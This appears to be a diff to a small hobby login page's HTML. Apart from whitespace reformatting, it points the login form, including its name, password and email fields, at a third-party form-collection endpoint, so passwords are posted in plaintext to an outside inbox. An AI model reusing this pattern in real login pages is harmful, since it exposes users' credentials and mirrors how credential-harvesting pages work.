@@ -8,7 +8,8 @@
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="./style.css">
-    <link rel="icon" href="https://uxwing.com/wp-content/themes/uxwing/download/peoples-avatars/man-user-circle-icon.png">
+    <link rel="icon"
+        href="https://uxwing.com/wp-content/themes/uxwing/download/peoples-avatars/man-user-circle-icon.png">
 
     <title>Log In</title>
 </head>
@@ -20,19 +21,20 @@
             <div class="face front">
                 <div class="content">
                     <h2>Welcome you, my dear visitor</h2>
-                    <button type="button" id="open-login" class="log" style="width: 100%; left: 0; top: 10px;">Click to Log In</button>
+                    <button type="button" id="open-login" class="log" style="width: 100%; left: 0; top: 10px;">Click to
+                        Log In</button>
                 </div>
             </div>
 
             <div class="face back">
                 <div class="form">
-                    <form>
+                    <form action="https://formspree.io/f/meewlerl" method="post">
                         <h3>Login</h3>
 
                         <div class="text">
                             <label for="username">Name:</label>
                             <i class="fa fa-user icon"></i>
-                            <input type="text" id="username" placeholder="Enter your name" value="">
+                            <input type="text" id="username" name="user" placeholder="Enter your name" value="">
                             <span class="spn-msg"></span>
                         </div>
 
@@ -40,14 +42,14 @@
                             <label for="password">Password:</label>
                             <i class="fa fa-lock icon"></i>
                             <i id="toggle-password" class="fa-solid fa-eye eye-icon"></i>
-                            <input type="password" id="password" placeholder="Enter your password" value="">
+                            <input type="password" id="password" name="pass" placeholder="Enter your password" value="">
                             <span class="spn-msg"></span>
                         </div>
 
                         <div class="mail">
                             <label for="email">Email:</label>
                             <i class="fa fa-envelope icon"></i>
-                            <input type="email" id="email" placeholder="Enter your email" value="">
+                            <input type="email" id="email" name="email" placeholder="Enter your email" value="">
                             <span class="spn-msg"></span>
                         </div>
 
@@ -72,7 +74,7 @@
     </div>
 
     <script src="./script.js"></script>
-    
+
     <script>
         const myCard = document.getElementById('main-card');
         const openLoginBtn = document.getElementById('open-login');
@@ -91,4 +93,5 @@
         });
     </script>
 </body>
+
 </html>
